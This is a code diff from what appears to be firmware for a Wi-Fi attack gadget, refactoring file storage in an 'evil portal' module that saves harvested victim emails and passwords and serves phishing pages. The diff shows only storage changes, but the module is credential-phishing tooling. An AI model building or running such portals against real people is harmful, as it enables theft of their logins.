@@ -1,21 +1,13 @@
 // PID::EVIL_PORTAL
 
-#include <LittleFS.h>
-
 const char* EVIL_PORTAL_CREDS_FILE = "/evil_portal_creds.txt";
 IPAddress EVIL_PORTAL_GATEWAY(172, 0, 0, 1);
 IPAddress EVIL_PORTAL_SUBNET(255, 255, 255, 0);
 int evilPortalVictimCount = 0;
 
 void evilPortalSaveCreds(String email, String password) {
-	if (!lfsBegin()) return;
-
-	File f = LittleFS.open(EVIL_PORTAL_CREDS_FILE, FILE_APPEND);
-	if (!f) {
-		// try create new
-		f = LittleFS.open(EVIL_PORTAL_CREDS_FILE, FILE_WRITE);
-		if (!f) return;
-	}
+	File f = Storage::open(EVIL_PORTAL_CREDS_FILE, "a", true);
+	if (!f) return;
 
 	DeviceTime dt = deviceGetTime();
 	char timeBuf[16];
@@ -99,8 +91,7 @@ static void _evilPortalServeFsFile(const String& uri, const String& htmlPath, bo
 		}
 	}
 
-	File f;
-	f = useSd ? SD.open(path) : LittleFS.open(path);
+	File f = Storage::open(path.c_str(), "r", !useSd);
 	if (f) {
 		webServer.streamFile(f, getContentType(path));
 		f.close();
